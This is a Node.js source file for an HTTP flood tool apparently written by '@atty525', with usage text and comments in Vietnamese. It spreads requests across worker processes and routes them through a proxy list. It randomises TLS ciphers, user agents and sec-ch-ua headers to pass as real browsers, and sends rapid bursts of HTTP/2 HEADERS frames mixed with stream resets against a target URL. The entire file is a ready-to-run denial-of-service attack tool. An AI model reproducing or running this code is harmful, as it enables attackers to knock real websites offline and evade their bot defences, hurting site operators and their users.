const fs = require('fs');
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const crypto = require('crypto');
const os = require('os');
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;


process.setMaxListeners(0);
process.on('uncaughtException', (e) => { console.log('\x1b[31m' + e + '\x1b[0m') }); // Đỏ cho lỗi uncaughtException - Bản quyền: @atty525
process.on('unhandledRejection', (e) => { console.log('\x1b[31m' + e + '\x1b[0m') }); // Đỏ cho lỗi unhandledRejection - Bản quyền: @atty525

// Kiểm tra tham số đầu vào
if (process.argv.length < 7) {
    console.log("\x1b[35m\nCách sử dụng: (Bản quyền: @atty525)\x1b[0m"); // Tím cho tiêu đề
    console.log("\x1b[95mnode du.js <target> <time> <threads> <ratelimit> <proxy-file>\x1b[0m"); // Hồng cho lệnh
    console.log("\x1b[95m\nVí dụ: node du.js https://example.com 60 4 100 proxies.txt\x1b[0m"); // Hồng cho ví dụ
    console.log("\x1b[31m- target: URL đích (bao gồm http:// hoặc https://)\x1b[0m"); // Đỏ cho mô tả
    console.log("\x1b[31m- time: Thời gian chạy (giây)\x1b[0m"); // Đỏ cho mô tả
    console.log("\x1b[31m- threads: Số luồng\x1b[0m"); // Đỏ cho mô tả
    console.log("\x1b[31m- ratelimit: Giới hạn request mỗi kết nối\x1b[0m"); // Đỏ cho mô tả
    console.log("\x1b[31m- proxy-file: Đường dẫn đến file chứa danh sách proxy\x1b[0m\n"); // Đỏ cho mô tả
    process.exit(1);
}


// Kiểm tra URL hợp lệ
try {
    new URL(process.argv[2]);
    if (!process.argv[2].startsWith('http')) {
        throw new Error('URL phải bắt đầu bằng http:// hoặc https://');
    }
} catch (error) {
    console.error(`\x1b[31m\nLỗi: URL không hợp lệ - ${error.message} (Bản quyền: @atty525)\x1b[0m\n`); // Đỏ cho lỗi URL
    process.exit(1);
}


// Kiểm tra file proxy tồn tại
if (!fs.existsSync(process.argv[6])) {
    console.error(`\x1b[31m\nLỗi: File proxy "${process.argv[6]}" không tồn tại (Bản quyền: @atty525)\x1b[0m\n`); // Đỏ cho lỗi file proxy
    process.exit(1);
}


const target = process.argv[2];
const time = parseInt(process.argv[3], 10);
const threads = parseInt(process.argv[4], 10);
const ratelimit = parseInt(process.argv[5], 10);
const url = new URL(target);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";


function generateRandomString(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let randomString = '';
    for (let i = 0; i < length; i++) {
        randomString += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return randomString;
}


function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}


let chr = 100;
let chr_2 = 101;
let minifix = false;


setInterval(() => {
    chr = generateRandomNumber(100, 135);
    chr_2 = generateRandomNumber(100, 135);
    minifix = !minifix
}, 1000);


function generateHeaders(url, streamId, type, statuses, version) {
    const randomString = generateRandomString(10);
    let newpathname = url.pathname;
    const header = {};


    var userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chr}.0.0.0 Safari/537.36`;
    if (Math.random() < 0.5) {
        userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chr}.0.0.0 Safari/537.36`;
    } else {
        userAgent = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chr_2}.0.0.0 Safari/537.36`;
    }


    var acceptLanguage = `en-US,en;q=0.${chr_2}`;
    if (Math.random() < 0.2 && minifix == false) {
        acceptLanguage = `en-US,en;q=0.${chr_2}`;
    } else {
        acceptLanguage = `${generateRandomString(2)}-${generateRandomString(2)},${generateRandomString(2)};q=0.9`;
    }



    const secChUa = [
        `" Not A;Brand";v="${generateRandomNumber(5, 98)}", "Chromium";v="${generateRandomNumber(80, 100)}", "Google Chrome";v="${generateRandomNumber(80, 100)}"`,
        `" Not A;Brand";v="${generateRandomNumber(5, 98)}", "Chromium";v="${generateRandomNumber(80, 100)}", "Google Chrome";v="${generateRandomNumber(80, 100)}"`,
        `" Not A;Brand";v="${generateRandomNumber(5, 98)}", "Chromium";v="${generateRandomNumber(80, 100)}", "Google Chrome";v="${generateRandomNumber(80, 100)}"`,
        `" Not A;Brand";v="${generateRandomNumber(5, 98)}", "Chromium";v="${generateRandomNumber(80, 100)}", "Google Chrome";v="${generateRandomNumber(80, 100)}"`
    ];


    const secChUaValue = secChUa[Math.floor(Math.random() * secChUa.length)];


    let platform
    if (userAgent.includes('Windows')) {
        platform = "Windows";
    } else if (userAgent.includes('Macintosh')) {
        platform = 'macOSX';
    }
    if (streamId === 1) { header["pragma"] = "no-cache"; header["cache-control"] = "no-cache"; }
    header['sec-ch-ua'] = secChUaValue;
    header['sec-ch-ua-mobile'] = "?0";
    header['sec-ch-ua-platform'] = platform;
    header['upgrade-insecure-requests'] = "1";
    header['user-agent'] = userAgent;
    header['accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
    header['sec-fetch-site'] = "same-origin";


    const fetchModes = ["navigate", "no-cors", "cors", "same-origin"];
    header['sec-fetch-mode'] = fetchModes[Math.floor(Math.random() * fetchModes.length)];


    const fetchUsers = ["?1", "?0"];
    header['sec-fetch-user'] = fetchUsers[Math.floor(Math.random() * fetchUsers.length)];


    const fetchDests = ["document", "iframe", "image", "script", "style", "font", "manifest"];
    header['sec-fetch-dest'] = fetchDests[Math.floor(Math.random() * fetchDests.length)];


    header['accept-encoding'] = "gzip, deflate, br, zstd";
    header['accept-language'] = acceptLanguage;
    header['priority'] = "u=0, i";
    header['referer'] = `${randomString}:${randomString}/${randomString}.${randomString}:${randomString}.${randomString}-${randomString}`;


    return { header, newpathname };
}


function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}


function decodeFrame(data) {
    if (data.length < 9) return null;
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;
    const payload = data.subarray(9 + offset, 9 + offset + length);
    if (payload.length + offset != length) return null;
    return { streamId, length, type, flags, payload };
}


function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}


function generateCiphers() {
    const availableCiphers = [
        'AES128-GCM-SHA256',
        'AES256-GCM-SHA384',
        'AES128-SHA256',
        'AES256-SHA256',
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES256-GCM-SHA384'
    ];


    const numCiphers = Math.floor(Math.random() * availableCiphers.length) + 1;
    const shuffledCiphers = availableCiphers.sort(() => Math.random() - 0.5);
    return shuffledCiphers.slice(0, numCiphers).join(':');
}


let version = 100;
let statuses = {};
const statusesQ = [];
let yasinpidora1 = 11111;
let yasinpidora4 = 22222;
let yasinpidora6 = 12121;


setInterval(() => version++, 3000);


function startRequest(proxies) {
    if (!proxies || proxies.length === 0) {
        console.error("\x1b[31mNo proxy list available (Bản quyền: @atty525)\x1b[0m"); // Đỏ cho lỗi proxy
        return;
    }
    
    var [proxyHost, proxyPort] = proxies[~~(Math.random() * proxies.length)].split(':');
    let SocketTLS;


    var netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            const protocols = ['h2', 'http/1.1'];
            const selectedProtocol = protocols[Math.floor(Math.random() * protocols.length)];
            SocketTLS = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: generateCiphers(),
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                session: crypto.randomBytes(64),
                secure: true,
                rejectUnauthorized: false
            }, () => {
                let streamId = 1;
                let streamIdReset = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);


                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(15663105, 0);


                let custom_table = 65535;
                let custom_window = 6291455;
                let custom_header = 262144;


                yasinpidora1 += 1;
                yasinpidora4 += 1;
                yasinpidora6 += 1;


                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        ...(Math.random() < 0.996 ? [[1, custom_table]] : [[1, yasinpidora1]]),
                        [2, 0],
                        ...(Math.random() < 0.996 ? [[4, custom_window]] : [[4, yasinpidora4]]),
                        ...(Math.random() < 0.996 ? [[6, custom_header]] : [[6, yasinpidora6]]),
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];


                SocketTLS.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) {
                                SocketTLS.write(encodeFrame(0, 4, "", 1));
                            }


                            if (frame.type == 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];


                                if (status === 403) {
                                    SocketTLS.end();
                                }


                                if (!statuses[status])
                                    statuses[status] = 0


                                statuses[status]++
                            }


                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (!statuses["GOAWAY"])
                                        statuses["GOAWAY"] = 0


                                    statuses["GOAWAY"]++
                                }
                                SocketTLS.end();
                            }
                        } else {
                            break;
                        }
                    }
                });


                SocketTLS.write(Buffer.concat(frames));


                if (SocketTLS && !SocketTLS.destroyed && SocketTLS.writable) {
                    for (let i = 0; i < ratelimit; i++) {
                        const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
                        const { header, newpathname } = generateHeaders(url, streamId, 0, statuses, version);


                        const headers = Object.entries({
                            ':method': 'GET',
                            ':authority': url.hostname,
                            ':scheme': 'https',
                            ":path": `${newpathname}`,
                        }).concat(Object.entries({
                            ...header
                        }).filter(a => a[1] != null));


                        const headers2 = Object.entries({
                            ...(Math.random() < 0.5 && { "cookie": `${randomString}=${randomString}` }),
                            ...(Math.random() < 0.5 && { "ultreminikall-x": `${randomString}=${randomString}` }),
                            ...(Math.random() < 0.5 && { "stresserapp-xss": `${randomString}=${randomString}` }),
                            ...(Math.random() < 0.5 && { "streswergserapp-xss": `${randomString}=${randomString}` }),
                            ...(Math.random() < 0.5 && { "stressewegrrapp-xss": `${randomString}=${randomString}` }),
                            ...(Math.random() < 0.5 && { "stresrjtyserapp-xss": `${randomString}=${randomString}` }),
                            ...(Math.random() < 0.5 && { "wsegwegfw": `${randomString}=${randomString}` }),
                            ...(Math.random() < 0.5 && { "ultremiwegwgwnikall-x": `${randomString}=${randomString}` }),
                            ...(Math.random() < 0.5 && { "stresserappsdfsf-xss": `${randomString}=${randomString}` }),
                            ...(Math.random() < 0.5 && { "streswewefwegrgserapp-xss": `${randomString}=${randomString}` }),
                            ...(Math.random() < 0.5 && { "stressherhewegrrapp-xss": `${randomString}=${randomString}` }),
                            ...(Math.random() < 0.5 && { "stresrasdsafwjtyserapp-xss": `${randomString}=${randomString}` }),
                        }).filter(a => a[1] != null);


                        const combinedHeaders = headers.concat(headers2);


                        if (selectedProtocol === 'h2') {
                            let packed = Buffer.concat([
                                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                hpack.encode(combinedHeaders)
                            ]);


                            SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                            if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                                SocketTLS.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                            }


                            streamIdReset += 2;
                            streamId += 2;
                        } else {
                            const headerLines = headers.map(([name, value]) => `${name}: ${value}`).join('\r\n');
                            const request = `GET ${newpathname} HTTP/1.1\r\n${headerLines}\r\n\r\n`;
                            SocketTLS.write(request);
                        }
                    }
                }
            });


            SocketTLS.on('error', (error) => cleanup(error));
            SocketTLS.on('close', () => cleanup());
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });


    netSocket.on('error', (error) => {
        cleanup();
    });
    netSocket.on('close', () => {
        cleanup();
    });


    function cleanup(error) {
        if (error) {
            //console.log('Error during cleanup:', error);
        }
        if (netSocket) {
            netSocket.destroy();
            netSocket = null;
        }
        if (SocketTLS) {
            SocketTLS.end();
            SocketTLS = null;
        }
    }
}


if (cluster.isMaster) {
    // Đọc và lọc proxy trong master process
    let proxies = fs.readFileSync(process.argv[6], 'utf8')
        .replace(/\r/g, '')
        .split('\n')
        .filter(proxy => {
            if (!proxy || !proxy.includes(':')) return false;
            const [host, port] = proxy.split(':');
            const portNum = Number(port);
            return host && !isNaN(portNum) && portNum > 0 && portNum < 65536;
        });


    console.log(`\x1b[95mLoaded ${proxies.length} valid proxies (Bản quyền: @atty525)\x1b[0m`); // Hồng cho thông báo proxy


    // Kiểm tra nếu không có proxy hợp lệ nào
    if (proxies.length === 0) {
        console.error("\x1b[31mNo valid proxies found. Please check your proxy file. (Bản quyền: @atty525)\x1b[0m"); // Đỏ cho lỗi không có proxy
        process.exit(1);
    }


    // Tiếp tục khởi tạo workers và theo dõi chúng
    const workers = {};
    Array.from({ length: threads }, (_, i) => {
        const worker = cluster.fork({ core: i % os.cpus().length });
        // Gửi danh sách proxy đến worker
        worker.send({ type: 'PROXIES', proxies: proxies });
        return worker;
    });
    
    console.log(`\x1b[35mMain start :) (Bản quyền: @atty525)\x1b[0m`); // Tím cho thông báo start


    cluster.on('exit', (worker) => {
        const newWorker = cluster.fork({ core: worker.id % os.cpus().length });
        newWorker.send({ type: 'PROXIES', proxies: proxies });
    });


    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });


    setInterval(() => {
        let statuses = {};
        for (let w in workers) {
            if (workers[w][0].state == 'online') {
                for (let st of workers[w][1]) {
                    for (let code in st) {
                        if (statuses[code] == null)
                            statuses[code] = 0;


                        statuses[code] += st[code];
                    }
                }
            }
        }


        console.clear();
        console.log(`\x1b[95m${JSON.stringify(statuses)} (Bản quyền: @atty525)\x1b[0m`); // Hồng cho hiển thị statuses
    }, 1000);


    setTimeout(() => process.exit(1), time * 1000);
} else {
    // Worker process: Nhận danh sách proxy từ master
    let proxies = [];
    
    process.on('message', (message) => {
        if (message.type === 'PROXIES') {
            proxies = message.proxies;
        }
    });


    // Chỉ bắt đầu gửi request khi đã nhận được danh sách proxy
    let proxyReceived = false;
    const checkProxies = setInterval(() => {
        if (proxies.length > 0 && !proxyReceived) {
            proxyReceived = true;
            clearInterval(checkProxies);
            
            // Bắt đầu gửi request
            setInterval(() => {
                startRequest(proxies);
            }, 10);
            
            setInterval(() => {
                if (statusesQ.length >= 4)
                    statusesQ.shift();
                
                statusesQ.push(statuses);
                statuses = {};
                process.send(statusesQ);
            }, 950);
        }
    }, 100);


    setTimeout(() => process.exit(1), time * 1000);
}
